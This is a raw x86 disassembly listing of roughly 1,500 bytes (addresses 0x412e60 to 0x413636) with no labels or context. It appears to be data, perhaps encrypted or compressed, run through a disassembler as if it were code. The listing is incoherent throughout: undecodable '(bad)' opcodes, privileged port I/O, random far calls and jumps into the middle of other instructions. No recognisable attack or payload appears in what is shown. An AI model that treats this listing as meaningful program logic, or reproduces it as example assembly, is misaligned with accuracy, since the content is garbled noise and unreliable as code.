  412e60:	push   0x7b
  412e62:	push   0xbc98df3d
  412e67:	cmp    BYTE PTR [edi],ch
  412e69:	push   eax
  412e6a:	lea    edx,[ecx]
  412e6c:	stos   BYTE PTR es:[edi],al
  412e6d:	xchg   esi,eax
  412e6e:	jns    0x412eee
  412e70:	dec    edx
  412e71:	xchg   esp,eax
  412e72:	nop
  412e73:	ja     0x412e5e
  412e75:	repnz lods eax,DWORD PTR ds:[esi]
  412e77:	scas   al,BYTE PTR es:[edi]
  412e78:	mov    al,0xac
  412e7a:	mov    edx,DWORD PTR ds:0x2746ed7f
  412e80:	sub    BYTE PTR [ebx+0x77],ch
  412e83:	das    
  412e84:	adc    ebx,DWORD PTR [edi]
  412e86:	mov    ah,0x57
  412e88:	add    DWORD PTR [ecx-0x42],eax
  412e8b:	sub    DWORD PTR [edi],0x4b
  412e8e:	pop    edi
  412e8f:	inc    edi
  412e90:	jne    0x412f0c
  412e92:	push   esp
  412e93:	jne    0x412edf
  412e95:	push   0x8aaf48a2
  412e9a:	add    eax,0x78c90e81
  412e9f:	cmp    ah,BYTE PTR [esi+0x72]
  412ea2:	cld    
  412ea3:	mul    BYTE PTR [edx-0x66]
  412ea6:	int3   
  412ea7:	push   edi
  412ea8:	es mov esp,0xcb12dea4
  412eae:	imul   edx,DWORD PTR [ebx+0x4fb0c74a],0x76364aa0
  412eb8:	pop    ss
  412eb9:	shr    BYTE PTR [esi-0x7a],0x4b
  412ebd:	lods   eax,DWORD PTR ds:[esi]
  412ebe:	add    bl,dl
  412ec0:	sbb    ecx,edx
  412ec2:	jmp    0x412e54
  412ec4:	add    bh,0x47
  412ec7:	dec    eax
  412ec8:	test   al,0x77
  412eca:	ds stc 
  412ecc:	popf   
  412ecd:	test   BYTE PTR [edi-0x16],bh
  412ed0:	out    0x84,al
  412ed2:	jno    0x412ed4
  412ed4:	and    al,0x39
  412ed6:	mov    al,cl
  412ed8:	je     0x412e69
  412eda:	push   ebp
  412edb:	xor    bh,BYTE PTR [edx-0x67]
  412ede:	xchg   ebx,eax
  412edf:	sub    BYTE PTR [edi-0x651a1404],ch
  412ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ee6:	pop    eax
  412ee7:	push   0x4e
  412ee9:	and    dl,BYTE PTR [eax]
  412eeb:	inc    esi
  412eec:	or     BYTE PTR [esi+0x6a],0x89
  412ef0:	pop    es
  412ef1:	(bad)  
  412ef2:	int3   
  412ef3:	xor    BYTE PTR [esi+0x3e],al
  412ef6:	and    cl,BYTE PTR ds:0x46288a1f
  412efc:	jns    0x412f65
  412efe:	aam    0x64
  412f00:	adc    BYTE PTR [edi+0x150b8512],al
  412f06:	jl     0x412f29
  412f08:	(bad)  
  412f0a:	pop    ebx
  412f0b:	mov    ebx,0x1439a2e
  412f10:	daa    
  412f11:	out    0x92,eax
  412f13:	into   
  412f14:	mov    esi,0x6c5cfeb1
  412f19:	pop    esi
  412f1a:	add    ah,BYTE PTR [ecx+ecx*4]
  412f1d:	pop    ss
  412f1e:	add    bl,BYTE PTR [ebp+ecx*4+0x47]
  412f22:	or     DWORD PTR [ecx],esi
  412f24:	lods   al,BYTE PTR ds:[esi]
  412f25:	mov    ch,0x23
  412f27:	adc    bh,0xbb
  412f2a:	mov    eax,0x3bfdf7d3
  412f2f:	or     ch,BYTE PTR [eax+0x7ac9964e]
  412f35:	stos   BYTE PTR es:[edi],al
  412f36:	and    esp,DWORD PTR ds:0x15ea40af
  412f3c:	dec    ebx
  412f3d:	mov    ecx,DWORD PTR [esi]
  412f3f:	int    0xab
  412f41:	pop    ebp
  412f42:	push   ecx
  412f43:	fmul   st(6),st
  412f45:	jb     0x412ec8
  412f47:	ins    DWORD PTR es:[edi],dx
  412f48:	push   es
  412f49:	lock mov cl,0x84
  412f4c:	out    0xc3,eax
  412f4e:	lods   al,BYTE PTR fs:[esi]
  412f50:	mov    BYTE PTR [ebx-0x4954e3b2],ah
  412f56:	call   0x7831:0xc36b20f
  412f5d:	and    bh,al
  412f5f:	xchg   esi,eax
  412f60:	add    eax,0x30d33768
  412f65:	jmp    FWORD PTR [edx]
  412f67:	(bad)  
  412f68:	jo     0x412ef3
  412f6a:	mov    cl,0x7
  412f6c:	rcr    BYTE PTR cs:[ebx+0x5e28fbce],0xd5
  412f74:	fcom   QWORD PTR [edx+0x1f]
  412f77:	add    edi,DWORD PTR [ecx]
  412f79:	and    al,0xdf
  412f7b:	bound  ecx,QWORD PTR [edi]
  412f7d:	outs   dx,BYTE PTR ds:[esi]
  412f7e:	mov    WORD PTR [eax+eax*8],fs
  412f81:	and    BYTE PTR [edx+0x1e],0x93
  412f85:	xor    esp,DWORD PTR [ecx]
  412f87:	mov    bl,0x98
  412f89:	pop    es
  412f8a:	(bad)
  412f8e:	aas    
  412f8f:	rcl    BYTE PTR [esi+0x73],1
  412f92:	int    0x85
  412f94:	cmp    al,0xe7
  412f96:	inc    ebx
  412f97:	mov    ebx,0x71e38faa
  412f9c:	into   
  412f9d:	mov    bh,0xe
  412f9f:	inc    edx
  412fa0:	add    ecx,DWORD PTR [eax+ebx*1+0x4f487cd0]
  412fa7:	(bad)  
  412fa9:	sar    BYTE PTR [esi+0x320ce9cc],0x2e
  412fb0:	fiadd  WORD PTR [edx]
  412fb2:	xchg   esi,eax
  412fb3:	cmp    edx,DWORD PTR [edx]
  412fb5:	xor    dl,bl
  412fb7:	sbb    bh,BYTE PTR [edi+0x301e0052]
  412fbd:	call   0x735c:0x88140f30
  412fc4:	jecxz  0x412fc0
  412fc6:	mov    eax,ds:0x3c4fb15f
  412fcb:	push   es
  412fcc:	lahf   
  412fcd:	push   eax
  412fce:	adc    esi,DWORD PTR [edi+0x7]
  412fd1:	mov    dh,0x22
  412fd3:	clc    
  412fd4:	(bad)  
  412fd5:	cmp    DWORD PTR ds:0x2403882a,eax
  412fdb:	fimul  DWORD PTR [eax]
  412fdd:	fidivr WORD PTR [eax-0x42]
  412fe0:	dec    eax
  412fe1:	xor    dh,BYTE PTR cs:[ecx]
  412fe4:	into   
  412fe5:	and    ecx,DWORD PTR [edi+0x2062f2a3]
  412feb:	mov    bh,0x8e
  412fed:	shl    edx,cl
  412fef:	fs nop
  412ff1:	push   edi
  412ff2:	clc    
  412ff3:	(bad)  ss:[edi+ebx*4-0x43]
  412ff8:	jecxz  0x412fbe
  412ffa:	push   esi
  412ffb:	sbb    DWORD PTR [ebx+0x1e],ebp
  412ffe:	nop
  412fff:	aaa    
  413000:	push   ecx
  413001:	sar    DWORD PTR [ebp-0x4f],0xc6
  413005:	jbe    0x412fc1
  413007:	mov    al,ds:0x5a33b4b
  41300c:	adc    edx,esi
  41300e:	stos   DWORD PTR es:[edi],eax
  41300f:	mov    ch,cl
  413011:	push   esp
  413012:	(bad)  
  413013:	scas   eax,DWORD PTR es:[edi]
  413014:	sub    BYTE PTR [ecx],dl
  413016:	and    BYTE PTR [esp+eax*2+0x64],cl
  41301a:	push   ecx
  41301b:	mov    esp,0xc37edaf1
  413020:	pop    ss
  413021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413022:	ror    ah,cl
  413024:	jg     0x413085
  413026:	fiadd  DWORD PTR [ecx-0x62]
  413029:	pop    ecx
  41302a:	fcom   QWORD PTR [edi+0x56333af6]
  413030:	das    
  413031:	ds enter 0xa52f,0x34
  413036:	push   cs
  413037:	jmp    0xb209:0x1b4452e3
  41303e:	outs   dx,DWORD PTR ds:[esi]
  41303f:	scas   al,BYTE PTR es:[edi]
  413040:	ret    0x7512
  413043:	push   ebp
  413044:	pop    esp
  413045:	jecxz  0x413078
  413047:	cdq    
  413048:	call   0xb5a3fd4e
  41304d:	xchg   ecx,eax
  41304e:	mov    ds:0xe35b6f5e,al
  413053:	mov    bh,0x22
  413055:	std    
  413056:	int    0x4
  413058:	cli    
  413059:	adc    bh,BYTE PTR [eax+0x53]
  41305c:	cmp    al,0x85
  41305e:	fsub   DWORD PTR [ebp+0x44]
  413061:	jbe    0x413012
  413063:	pop    ebx
  413064:	mov    eax,ds:0x92b68cd2
  413069:	in     eax,dx
  41306a:	jae    0x413067
  41306c:	push   es
  41306d:	shr    DWORD PTR [edx-0x5a],0xd7
  413071:	jne    0x413017
  413073:	cmp    eax,0x310e26f5
  413078:	mov    ebx,0x22c4028
  41307d:	xchg   esi,eax
  41307e:	fmul   st,st(6)
  413080:	call   0x171d:0x6c15f3f7
  413087:	test   al,0x11
  413089:	sub    al,0x6f
  41308b:	inc    esp
  41308c:	cwde   
  41308d:	mov    esi,DWORD PTR [edi+0x74]
  413090:	xchg   DWORD PTR [ecx],esi
  413092:	inc    edi
  413093:	push   edx
  413094:	push   esp
  413095:	mov    cl,0x67
  413097:	mov    cl,0x34
  413099:	cmp    eax,0xa111676b
  41309e:	mov    dl,0x1c
  4130a0:	cmp    bl,BYTE PTR [esi+eiz*4+0x4f9cb14f]
  4130a7:	adc    BYTE PTR [ebp-0x31],bl
  4130aa:	pop    ebx
  4130ab:	jg     0x4130e0
  4130ad:	ds int 0x87
  4130b0:	adc    dh,bl
  4130b2:	outs   dx,BYTE PTR ds:[esi]
  4130b3:	enter  0xd3f0,0x2a
  4130b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130b8:	ds jmp 0xbc7e:0xfc30cd9f
  4130c0:	fdiv   DWORD PTR [edi]
  4130c2:	dec    ecx
  4130c3:	push   ebx
  4130c4:	sbb    ebx,eax
  4130c6:	inc    eax
  4130c7:	sbb    al,BYTE PTR ds:0x259ac521
  4130cd:	jg     0x413111
  4130cf:	or     eax,0x472667ac
  4130d4:	xor    esp,DWORD PTR [ecx]
  4130d6:	push   esi
  4130d7:	pop    ss
  4130d8:	scas   al,BYTE PTR es:[edi]
  4130d9:	jb     0x4130fe
  4130db:	lods   al,BYTE PTR ds:[esi]
  4130dc:	call   FWORD PTR [edi-0x76f1365b]
  4130e2:	sub    DWORD PTR [edi],edi
  4130e4:	adc    al,0xd5
  4130e6:	test   eax,0x8f75e67f
  4130eb:	push   es
  4130ec:	ds add eax,0x2cf3c12
  4130f2:	int    0x81
  4130f4:	sbb    BYTE PTR [ecx+eax*4],bl
  4130f7:	push   eax
  4130f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130f9:	mov    ds:0x974dc586,al
  4130fe:	(bad)  
  413100:	ror    ebp,cl
  413102:	mov    ch,bh
  413104:	jo     0x41310e
  413106:	sub    esp,ebp
  413108:	mov    cl,BYTE PTR [eax]
  41310a:	push   es
  41310b:	out    dx,eax
  41310c:	pop    ebp
  41310d:	adc    dl,BYTE PTR [edi-0x6f]
  413110:	cli    
  413111:	inc    edx
  413112:	xor    eax,0x939689ea
  413117:	cmp    eax,ebx
  413119:	and    BYTE PTR [ebp+0x7],0x9d
  41311d:	dec    edi
  41311e:	xor    eax,0x11598cae
  413123:	pop    ebx
  413124:	std    
  413125:	mov    ah,dh
  413127:	jnp    0x4130cb
  413129:	jne    0x41317c
  41312b:	lods   al,BYTE PTR ds:[esi]
  41312c:	xchg   esi,edx
  41312e:	pop    esi
  41312f:	xor    eax,0xe80a733d
  413134:	mov    DWORD PTR [edx+0xa],ebp
  413137:	outs   dx,DWORD PTR ds:[esi]
  413138:	fdivrp st(3),st
  41313a:	sar    ecx,1
  41313c:	mov    BYTE PTR [ebp+0x7f],dh
  41313f:	popa   
  413140:	out    0x17,eax
  413142:	loopne 0x413155
  413144:	pushf  
  413145:	xchg   esi,eax
  413146:	sahf   
  413147:	outs   dx,DWORD PTR ds:[esi]
  413148:	dec    ecx
  413149:	push   ebx
  41314a:	(bad)  
  41314b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41314c:	(bad)  
  41314d:	mov    eax,0x3e4dc16b
  413152:	imul   esp,DWORD PTR ds:0x3dc7bb1e,0x39
  413159:	clc    
  41315a:	mov    ds:0x746ac995,eax
  41315f:	add    eax,0x2dbaafc7
  413164:	xor    edx,DWORD PTR [edi-0x1c7631ee]
  41316a:	jecxz  0x413159
  41316c:	or     al,BYTE PTR [esi+0x25]
  41316f:	xor    esi,esi
  413171:	cs icebp 
  413173:	sbb    ecx,DWORD PTR [ecx+0x611f2def]
  413179:	xchg   esi,eax
  41317a:	push   edi
  41317b:	adc    eax,esi
  41317d:	imul   esi,DWORD PTR [edi+0x548fd631],0xfffffffe
  413184:	cmp    eax,0xa974e779
  413189:	cs ds xchg ecx,eax
  41318c:	push   0xbad1490f
  413191:	jle    0x413180
  413193:	retf   
  413194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413195:	adc    ah,BYTE PTR [edi+0x29]
  413198:	jmp    0x793eaf98
  41319d:	fmul   st(7),st
  41319f:	dec    ecx
  4131a0:	inc    edx
  4131a1:	xor    BYTE PTR [ebx-0x68b83cde],ch
  4131a7:	neg    BYTE PTR [edx+0x291498ba]
  4131ad:	mov    dh,0x1
  4131af:	sbb    DWORD PTR [edi-0x8b388e0],0xffffffdd
  4131b6:	inc    esi
  4131b7:	mov    dh,BYTE PTR [ebx+0x17]
  4131ba:	add    dl,BYTE PTR [esi+0x31]
  4131bd:	pusha  
  4131be:	adc    DWORD PTR [ecx],ebx
  4131c0:	sub    bh,bh
  4131c2:	aaa    
  4131c3:	loope  0x413217
  4131c5:	pop    eax
  4131c6:	pop    ss
  4131c7:	or     eax,0x2b6f3e78
  4131cc:	push   esi
  4131cd:	mov    BYTE PTR [esi],ch
  4131cf:	ins    DWORD PTR es:[edi],dx
  4131d0:	in     eax,0xb5
  4131d2:	dec    ebp
  4131d3:	xor    ch,BYTE PTR [edx]
  4131d5:	das    
  4131d6:	add    BYTE PTR [edx],0x1e
  4131d9:	and    al,0xb7
  4131db:	ins    DWORD PTR es:[edi],dx
  4131dc:	ds mov bl,0x2a
  4131df:	adc    esi,DWORD PTR [edi]
  4131e1:	cmp    BYTE PTR [esi-0x4f5731ee],ch
  4131e7:	mov    ds:0x6fdd4d24,eax
  4131ec:	jge    0x413263
  4131ee:	jb     0x413224
  4131f0:	lock or ah,bl
  4131f3:	adc    al,0xbd
  4131f5:	push   0xffffff8d
  4131f7:	arpl   bp,sp
  4131f9:	arpl   dx,si
  4131fb:	setno  BYTE PTR [edx+edi*2]
  4131ff:	push   0xa8f72dbc
  413204:	xor    BYTE PTR [esi-0x3c],ah
  413207:	imul   edi,eax,0xffffff9e
  41320a:	shr    DWORD PTR [esi-0x41],1
  41320d:	mov    al,ds:0x4e45ad3b
  413212:	dec    esp
  413213:	(bad)  
  413215:	popf   
  413216:	aas    
  413217:	and    DWORD PTR [ebx-0x57],eax
  41321a:	fdiv   st(2),st
  41321c:	shl    DWORD PTR [edi+0x5f],0x1a
  413220:	xchg   DWORD PTR [eax],eax
  413222:	call   0x121f88e1
  413227:	pusha  
  413228:	mov    eax,ds:0x8f48b08b
  41322d:	jl     0x41322e
  41322f:	rcr    BYTE PTR ds:0x244cb3a8,cl
  413235:	mov    esp,0xccfe96a4
  41323a:	rcr    DWORD PTR [eax-0x23c64e68],cl
  413240:	std    
  413241:	mov    edx,ecx
  413243:	aaa    
  413244:	ins    DWORD PTR es:[edi],dx
  413245:	fnsave [ecx-0x2df82aba]
  41324b:	ins    DWORD PTR es:[edi],dx
  41324c:	(bad)  
  41324d:	shr    DWORD PTR [eax-0x7c4952cd],1
  413253:	ja     0x41325f
  413255:	mov    dl,0xc1
  413257:	je     0x4132b0
  413259:	sbb    al,BYTE PTR [esi-0x64]
  41325c:	sti    
  41325d:	jo     0x4131e9
  41325f:	add    BYTE PTR [esi-0x7e7f287f],ah
  413265:	imul   ecx,DWORD PTR [ebx-0x73],0xffffffca
  413269:	mov    ah,0x31
  41326b:	es ins DWORD PTR es:[edi],dx
  41326d:	push   cs
  41326e:	mov    ds:0xe73c7424,eax
  413273:	push   ss
  413274:	shr    al,1
  413276:	stos   BYTE PTR es:[edi],al
  413277:	addr16 lahf 
  413279:	dec    ecx
  41327a:	fmulp  st(0),st
  41327c:	cmp    ecx,DWORD PTR [eax+0x7d]
  41327f:	cdq    
  413280:	test   eax,0x4e361992
  413285:	dec    ebx
  413286:	push   ebp
  413287:	rcl    BYTE PTR [esi],1
  413289:	inc    ebx
  41328a:	pop    es
  41328b:	fst    QWORD PTR [eax-0x58d8e034]
  413291:	iret   
  413292:	sbb    DWORD PTR [ebx-0x5e],eax
  413295:	ds jno 0x41323c
  413298:	adc    dl,BYTE PTR [edi]
  41329a:	mov    ch,BYTE PTR [ebx]
  41329c:	das    
  41329d:	sub    al,0xd
  41329f:	ret    0x52f
  4132a2:	jo     0x41325a
  4132a4:	dec    esi
  4132a5:	jae    0x413289
  4132a7:	inc    ebp
  4132a8:	in     al,0x41
  4132aa:	push   edi
  4132ab:	cdq    
  4132ac:	pushf  
  4132ad:	jmp    0xbbd524c9
  4132b2:	jle    0x4132e0
  4132b4:	mov    ebx,DWORD PTR [edi]
  4132b6:	cdq    
  4132b7:	rcr    DWORD PTR [ecx],0x20
  4132ba:	sbb    eax,DWORD PTR [esi]
  4132bc:	jbe    0x4132ad
  4132be:	repz xchg ebx,eax
  4132c0:	push   edi
  4132c1:	iret   
  4132c2:	dec    ebp
  4132c3:	cmp    BYTE PTR [edi-0x5e],0xe1
  4132c7:	lds    esp,FWORD PTR [edx]
  4132c9:	data16 adc cl,BYTE PTR [edi]
  4132cc:	cwde   
  4132cd:	push   edi
  4132ce:	sbb    al,0x92
  4132d0:	cmc    
  4132d1:	out    0xd4,eax
  4132d3:	sub    bl,BYTE PTR [esi+0x30]
  4132d6:	xor    BYTE PTR [eax],cl
  4132d8:	inc    edx
  4132d9:	xchg   ebp,eax
  4132da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132db:	xchg   esi,eax
  4132dc:	and    al,0x41
  4132de:	adc    eax,0xf400fcc2
  4132e3:	or     dl,BYTE PTR ds:0xfd5e235
  4132e9:	in     al,dx
  4132ea:	addr16 call 0x4ba64963
  4132f0:	sbb    esp,edi
  4132f2:	jne    0x4132e3
  4132f4:	sbb    eax,0xb397162b
  4132f9:	imul   eax,esp,0x99eb0df3
  4132ff:	test   DWORD PTR [eax-0x1e],ecx
  413302:	jb     0x41328a
  413304:	pop    es
  413305:	pushf  
  413306:	or     ebp,DWORD PTR [ecx-0x2be84edf]
  41330c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41330d:	repnz das 
  41330f:	imul   ebp,esi,0xffffffa4
  413312:	or     ah,BYTE PTR [eax]
  413314:	retf   0xba4a
  413317:	bound  eax,QWORD PTR [edx]
  413319:	rol    ch,cl
  41331b:	mov    BYTE PTR ds:0x97283be,bh
  413321:	shl    DWORD PTR [esi-0x11],cl
  413324:	pusha  
  413325:	test   DWORD PTR [edx+0x43966aab],esp
  41332b:	call   0x730697e6
  413330:	ficomp WORD PTR [esi]
  413332:	call   0x69c9:0xa898d120
  413339:	sbb    DWORD PTR [edi-0x33],edi
  41333c:	std    
  41333d:	adc    al,0xe7
  41333f:	jl     0x41330d
  413341:	inc    eax
  413342:	lock cwde 
  413344:	xor    dh,al
  413346:	jae    0x4132e5
  413348:	lea    edx,[ecx-0x53]
  41334b:	fnstsw WORD PTR [edi-0x7]
  41334e:	cmc    
  41334f:	repz inc edi
  413351:	mov    ecx,0x4ccaf00a
  413356:	xor    eax,0x83a051bd
  41335b:	(bad)  [ebx+eiz*4-0x74f7aa2d]
  413362:	test   eax,0x16091ae4
  413367:	mov    eax,ds:0x7f21a371
  41336c:	cdq    
  41336d:	jmp    0x413310
  41336f:	dec    esi
  413370:	cdq    
  413371:	mov    eax,0xc55dcf99
  413376:	fld    QWORD PTR [edi-0x18]
  413379:	pop    esp
  41337a:	scas   al,BYTE PTR es:[edi]
  41337b:	jmp    0x664bd142
  413380:	push   esp
  413381:	call   0x58e1f72
  413386:	jle    0x413366
  413388:	xor    DWORD PTR [edi],esp
  41338a:	fcos   
  41338c:	sahf   
  41338d:	xlat   BYTE PTR ds:[ebx]
  41338e:	sbb    BYTE PTR ds:0xe08c549f,0xc1
  413395:	adc    al,0x6f
  413397:	add    BYTE PTR [edx-0x456c4003],bl
  41339d:	push   ds
  41339e:	inc    ebp
  41339f:	hlt    
  4133a0:	lods   eax,DWORD PTR ds:[esi]
  4133a1:	enter  0x4114,0xf5
  4133a5:	repz ja 0x41335b
  4133a8:	push   ebp
  4133a9:	mov    dl,BYTE PTR [ecx+eax*8-0x2d98c5a0]
  4133b0:	clc    
  4133b1:	imul   esi,DWORD PTR [esi],0xffffff8a
  4133b4:	stos   DWORD PTR es:[edi],eax
  4133b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133b6:	cmp    edx,ebx
  4133b8:	mov    ds:0x12179198,eax
  4133bd:	mov    eax,0x641e18f2
  4133c2:	mov    BYTE PTR [eax+0x1f],dh
  4133c5:	ss push esi
  4133c7:	cmp    esi,0x7f
  4133ca:	inc    edi
  4133cb:	mov    al,0x2
  4133cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133ce:	icebp  
  4133cf:	mov    al,0x2f
  4133d1:	dec    esp
  4133d2:	lds    ebx,FWORD PTR [esi-0x13]
  4133d5:	sub    eax,0xb98bf813
  4133da:	and    ecx,esp
  4133dc:	mov    eax,0x7b39cfc0
  4133e1:	retf   
  4133e2:	adc    eax,0xb50c4272
  4133e7:	mov    ds:0x1e1ca48f,al
  4133ec:	pop    ss
  4133ed:	fcmovu st,st(6)
  4133ef:	cwde   
  4133f0:	test   BYTE PTR [ecx+edi*8],ah
  4133f3:	mov    ebp,0x97a645d5
  4133f8:	enter  0x810,0x4f
  4133fc:	push   eax
  4133fd:	or     DWORD PTR [ebx-0x65ded401],0xffffffab
  413404:	push   es
  413405:	loopne 0x41343e
  413407:	call   0x41d5:0x3eb285e8
  41340e:	push   es
  41340f:	out    dx,eax
  413410:	je     0x4133a6
  413412:	lahf   
  413413:	test   ecx,ebx
  413415:	aam    0x6c
  413417:	(bad)  
  413418:	and    ah,BYTE PTR [ebx+0x13]
  41341b:	iret   
  41341c:	aaa    
  41341d:	push   edx
  41341e:	push   es
  41341f:	or     BYTE PTR [edi-0x439054f7],ah
  413425:	ins    DWORD PTR es:[edi],dx
  413426:	mov    bl,0x9a
  413428:	lock adc eax,0x25f2c669
  41342e:	pop    ss
  41342f:	cwde   
  413430:	push   0xffffffc2
  413432:	pop    ebp
  413433:	or     edi,DWORD PTR [esi]
  413435:	jo     0x4134a7
  413437:	jecxz  0x413412
  413439:	jp     0x413490
  41343b:	push   ds
  41343c:	adc    al,0xa6
  41343e:	fld1   
  413440:	add    BYTE PTR [eax+0x11],dl
  413443:	pusha  
  413444:	ficomp DWORD PTR [esi+ecx*4-0x74]
  413448:	xor    ecx,DWORD PTR [ebp*1-0x3bc12ab1]
  41344f:	xchg   edi,eax
  413450:	int3   
  413451:	js     0x413400
  413453:	add    cl,cl
  413455:	jns    0x4134bd
  413457:	shl    dh,1
  413459:	mov    esp,0x360b2e2d
  41345e:	pop    eax
  41345f:	not    BYTE PTR [esi-0x29]
  413462:	shr    BYTE PTR [ecx-0x12],1
  413465:	or     ecx,esp
  413467:	sub    eax,0xc0a9c703
  41346c:	mov    bl,0xb8
  41346e:	mov    esi,0x337cd637
  413473:	pusha  
  413474:	jecxz  0x4134c0
  413476:	xor    ecx,esi
  413478:	or     cl,BYTE PTR [eax-0x43ea5a96]
  41347e:	fwait
  41347f:	dec    eax
  413480:	lea    esp,[eax]
  413482:	shl    ebp,0xc0
  413485:	inc    ebp
  413486:	push   cs
  413487:	pusha  
  413488:	js     0x413460
  41348a:	jecxz  0x413424
  41348c:	ja     0x413474
  41348e:	xchg   DWORD PTR [ebx-0x60a02201],esi
  413494:	jl     0x413502
  413496:	lods   al,BYTE PTR ds:[esi]
  413497:	int    0xf9
  413499:	(bad)  
  41349c:	je     0x41341e
  41349e:	sar    eax,cl
  4134a0:	scas   eax,DWORD PTR es:[edi]
  4134a1:	call   0xbc34:0x8ad3cf90
  4134a8:	scas   eax,DWORD PTR es:[edi]
  4134a9:	in     al,dx
  4134aa:	xor    eax,0x57f176af
  4134af:	xor    cl,BYTE PTR [edx]
  4134b1:	jbe    0x41350e
  4134b3:	in     al,dx
  4134b4:	cdq    
  4134b5:	mov    dl,0x10
  4134b7:	retf   
  4134b8:	in     al,0xa
  4134ba:	mov    ah,0x19
  4134bc:	xor    eax,0xb3cf682c
  4134c1:	mov    al,0xb0
  4134c3:	add    DWORD PTR [eax+eiz*4+0x794dbf9b],edx
  4134ca:	imul   BYTE PTR [esi+0x4f]
  4134cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ce:	lea    esi,[edi+0x27]
  4134d1:	inc    esp
  4134d2:	lds    esp,FWORD PTR [eax+0x4240919c]
  4134d8:	arpl   WORD PTR [ecx],di
  4134da:	lahf   
  4134db:	push   cs
  4134dc:	out    0x51,eax
  4134de:	lea    edx,[ebx-0x5ffdf77a]
  4134e4:	rcl    DWORD PTR [eax-0x6d],0x37
  4134e8:	and    eax,0xedcf73ec
  4134ed:	enter  0x19d8,0xb5
  4134f1:	xchg   edi,eax
  4134f2:	pop    esi
  4134f3:	shl    eax,1
  4134f5:	sub    eax,0xc6b0c746
  4134fa:	push   0xffffff87
  4134fc:	mov    ecx,0x1fbee7f0
  413501:	inc    bp
  413503:	push   edx
  413504:	jne    0x4134ed
  413506:	or     BYTE PTR [edi],bh
  413508:	and    bh,BYTE PTR [eax+0xb]
  41350b:	rcl    DWORD PTR [eax-0x43864d1a],1
  413511:	add    DWORD PTR [ecx],0xffffff9e
  413514:	std    
  413515:	jmp    0x4134b7
  413517:	loop   0x413559
  413519:	jb     0x413527
  41351b:	xchg   ecx,eax
  41351c:	(bad)  
  41351d:	mov    cs,WORD PTR ds:[ebx]
  413520:	sub    bl,al
  413522:	sub    al,0x59
  413524:	xchg   ebx,eax
  413525:	or     BYTE PTR [esi-0x7e1b7f],cl
  41352b:	xchg   BYTE PTR [eax+0x3b],ah
  41352e:	xor    DWORD PTR [ebp+0x61],edx
  413531:	in     al,dx
  413532:	(bad)  
  413533:	dec    ebp
  413534:	sbb    ebp,DWORD PTR ds:0x7028dabc
  41353a:	cmp    al,0xd4
  41353c:	stos   BYTE PTR es:[edi],al
  41353d:	pop    eax
  41353e:	mov    eax,0x783b33ec
  413543:	mov    BYTE PTR [ebx+eax*2+0x71],cl
  413547:	hlt    
  413548:	sub    ebx,DWORD PTR [eax+esi*8-0x5c]
  41354c:	mov    edx,0x78a1a7d5
  413551:	pusha  
  413552:	sti    
  413553:	xchg   esi,eax
  413554:	pushw  0xffeb
  413557:	sub    eax,0x882726a7
  41355c:	sbb    eax,0x9f6fd9f
  413561:	fldln2 
  413563:	aam    0x25
  413565:	add    bh,0xf1
  413568:	add    eax,DWORD PTR [ebx+esi*8+0x4bb0eb3d]
  41356f:	loope  0x4135af
  413571:	sub    bl,bl
  413573:	into   
  413574:	adc    al,0x41
  413576:	jo     0x413507
  413578:	mov    edi,0x38368653
  41357d:	in     eax,dx
  41357e:	push   ds
  41357f:	test   BYTE PTR [edx-0x18],0x9a
  413583:	fsubr  DWORD PTR [eax+0x50]
  413586:	(bad)  
  413587:	push   eax
  413588:	xchg   esp,eax
  413589:	inc    ecx
  41358a:	sahf   
  41358b:	mov    ebx,DWORD PTR [eax-0x2e3393bc]
  413591:	xchg   ebp,eax
  413592:	push   edi
  413593:	push   ebp
  413594:	(bad)  
  413595:	or     bh,bl
  413597:	out    0x5d,eax
  413599:	aad    0x76
  41359b:	inc    ebx
  41359c:	imul   ebx,edx,0x499dd55d
  4135a2:	jbe    0x413538
  4135a4:	jecxz  0x4135fe
  4135a6:	jmp    0x8d2b:0x3c11cdf5
  4135ad:	adc    BYTE PTR [eax],bh
  4135af:	mov    ebx,fs
  4135b1:	adc    BYTE PTR [esi],dl
  4135b3:	stos   DWORD PTR es:[edi],eax
  4135b4:	rcr    DWORD PTR [esi+0x8],0x5c
  4135b8:	jg     0x413634
  4135ba:	rcpps  xmm7,XMMWORD PTR [ebp+0x74]
  4135be:	out    dx,eax
  4135bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c0:	int    0x2e
  4135c2:	or     ch,BYTE PTR [ecx+0x3e3aa0fc]
  4135c8:	inc    esp
  4135c9:	xor    ebx,DWORD PTR [esp+esi*4+0x7d]
  4135cd:	push   cs
  4135ce:	into   
  4135cf:	fild   WORD PTR ds:0x6ff3906e
  4135d5:	aam    0x59
  4135d7:	call   0xf68c6d73
  4135dc:	mov    eax,0xa7e7b996
  4135e2:	gs mov ebx,0x315e1f8e
  4135e8:	add    eax,0x623ab851
  4135ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135ee:	bound  ebx,QWORD PTR [edx-0xecfa76]
  4135f4:	sti    
  4135f5:	fimul  DWORD PTR [ecx]
  4135f7:	rol    BYTE PTR [esi+0x27a94034],0x39
  4135fe:	aad    0xdd
  413600:	adc    BYTE PTR [esi-0x7d603321],bh
  413606:	jne    0x4135a3
  413608:	test   al,0x32
  41360a:	mov    esi,0xe9071d7a
  41360f:	mov    esp,0xc669fdb2
  413614:	sbb    ebx,DWORD PTR [eax-0x5]
  413617:	mov    eax,ds:0x9446b81d
  41361c:	(bad)  
  41361d:	dec    ebp
  41361e:	imul   ebp,DWORD PTR [ebx-0x3f],0x21804036
  413625:	add    eax,ecx
  413627:	sub    BYTE PTR [ebp+0xb8b86e],dl
  41362d:	sahf   
  41362e:	or     eax,DWORD PTR [ebx]
  413630:	pusha  
  413631:	jg     0x413635
  413633:	or     edi,DWORD PTR [edi-0x4f]
  413636:	sbb    ecx,DWORD PTR [ecx]
